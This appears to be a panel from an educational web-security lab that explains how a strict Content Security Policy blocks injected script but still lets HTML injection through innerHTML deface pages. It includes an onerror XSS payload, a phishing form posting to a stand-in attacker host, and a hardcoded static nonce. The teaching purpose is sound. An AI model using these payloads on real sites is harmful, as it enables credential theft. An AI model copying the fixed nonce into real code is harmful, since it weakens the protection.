🛡 Expected Behavior — Version 3
Payloads with onerror / onload will be BLOCKED by CSP — check DevTools Console for violation errors.

However, plain HTML injection still works — you can still inject visible content, fake UI elements, and defacement into the page. The innerHTML vulnerability is not fixed.

⚠ Key Academic Insight
Strict CSP successfully prevents JavaScript execution from injected payloads — this is a real improvement over V1 and V2.

But it does NOT prevent HTML injection. An attacker can still: (1) deface the page, (2) inject fake login forms to capture credentials, (3) inject misleading content.

Conclusion: CSP is a mitigation, not a fix. The innerHTML vulnerability must be resolved at the code level.
How the nonce protects the legitimate script
// ✓ This executes — has the correct nonce
<script nonce="xSec2024ProjectNonce">
  ... all application logic here ...
</script>

// ✗ Injected payload — no nonce → BLOCKED by browser
<img src=x onerror="stealToken()">
// Console: Refused to execute inline event handler
//          because it violates CSP script-src directive.

// ✗ But HTML still renders (CSP does not block HTML):
<form action="https://attacker.com/phish">...</form>
// This renders visually. No CSP violation. User may be tricked.
